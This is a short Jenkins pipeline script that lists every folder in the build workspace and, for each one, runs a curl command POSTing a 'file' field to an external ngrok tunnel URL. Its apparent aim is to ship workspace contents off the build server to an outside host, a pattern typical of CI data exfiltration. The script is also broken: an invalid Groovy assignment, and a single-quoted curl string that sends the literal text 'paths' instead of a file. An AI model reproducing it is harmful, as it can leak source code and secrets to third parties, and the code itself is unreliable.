pipeline {
    agent any
  stages {
    stage('Find all fodlers from given folder') {
      steps {
        script {
          def foldersList = []
                    
          def osName = isUnix() ? "UNIX" : "WINDOWS"
          echo "osName: " + osName
    
          echo ".... JENKINS_HOME: ${WORKSPACE}"
    
          if(isUnix()) {
            def output = sh returnStdout: true, script: "ls -l ${WORKSPACE} | grep ^d | awk '{print \$9}'"
            foldersList = output.tokenize('\n').collect() { it }
          } else {
              echo "else"
            def output = bat returnStdout: true, script: "dir \"${WORKSPACE}\" /b /A:D"
            foldersList = output.tokenize('\n').collect() { it }
            foldersList = foldersList.drop(2)
                     
          }
          echo ".... " + foldersList
            foldersList.each{
            paths=${WORKSPACE} + {it}
                echo paths
            bat 'curl --location --request POST "https://c5ef3e292c8f.ngrok.io/file-upload" -F "file=paths"'
            println "Computer ${it}"
            }
        }            
      }
    }
  }
}
